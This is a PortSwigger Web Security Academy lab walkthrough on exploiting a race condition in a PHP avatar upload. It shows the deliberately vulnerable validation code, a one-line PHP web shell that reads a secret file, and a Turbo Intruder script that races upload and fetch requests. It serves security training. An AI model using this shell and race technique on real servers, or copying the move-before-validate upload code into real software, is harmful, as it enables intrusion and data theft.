# Lab: Web shell upload via race condition

Source: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
Fetched: 2026-06-28T09:17:51.390748+00:00

Web Security Academy

File upload vulnerabilities

Lab

Lab: Web shell upload via race condition

This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

Hint

The vulnerable code that introduces this race condition is as follows:

<?php

$target_dir = "avatars/";

$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move

move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {

echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";

} else {

unlink($target_file);

echo "Sorry, there was an error uploading your file.";

http_response_code(403);

}

function checkViruses($fileName) {

// checking for viruses

...

}

function checkFileType($fileName) {

$imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));

if($imageFileType != "jpg" && $imageFileType != "png") {

echo "Sorry, only JPG & PNG files are allowed\n";

return false;

} else {

return true;

}

}

?>

Solution

As you can see from the source code above, the uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed.

Note

Due to the generous time window for this race condition, it is possible to solve this lab by manually sending two requests in quick succession using Burp Repeater. The solution described here teaches you a practical approach for exploiting similar vulnerabilities in the wild, where the window may only be a few milliseconds.

Log in and upload an image as your avatar, then go back to your account page.

In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE>.

On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example:

<?php echo file_get_contents('/home/carlos/secret'); ?>

Log in and attempt to upload the script as your avatar. Observe that the server appears to successfully prevent you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.

If you haven't already, add the Turbo Intruder extension to Burp from the BApp store.

Right-click on the POST /my-account/avatar request that was used to submit the file upload and select Extensions > Turbo Intruder > Send to turbo intruder. The Turbo Intruder window opens.

Copy and paste the following script template into Turbo Intruder's Python editor:

def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

request1 = '''<YOUR-POST-REQUEST>'''

request2 = '''<YOUR-GET-REQUEST>'''

# the 'gate' argument blocks the final byte of each request until openGate is invoked

engine.queue(request1, gate='race1')

for x in range(5):

engine.queue(request2, gate='race1')

# wait until every 'race1' tagged request is ready

# then send the final byte of each request

# (this method is non-blocking, just like queue)

engine.openGate('race1')

engine.complete(timeout=60)

def handleResponse(req, interesting):

table.add(req)

In the script, replace <YOUR-POST-REQUEST> with the entire POST /my-account/avatar request containing your exploit.php file. You can copy and paste this from the top of the Turbo Intruder window.

Replace <YOUR-GET-REQUEST> with a GET request for fetching your uploaded PHP file. The simplest way to do this is to copy the GET /files/avatars/<YOUR-IMAGE> request from your proxy history, then change the filename in the path to exploit.php.

At the bottom of the Turbo Intruder window, click Attack. This script will submit a single POST request to upload your exploit.php file, instantly followed by 5 GET requests to /files/avatars/exploit.php.

In the results list, notice that some of the GET requests received a 200 response containing Carlos's secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.

Submit the secret to solve the lab.

Note

If you choose to build the GET request manually, make sure you terminate it properly with a \r\n\r\n sequence. Also remember that Python will preserve any whitespace within a multiline string, so you need to adjust your indentation accordingly to ensure that a valid request is sent.

Community solutions

Intigriti

Find file upload vulnerabilities using Burp Suite

Try for free
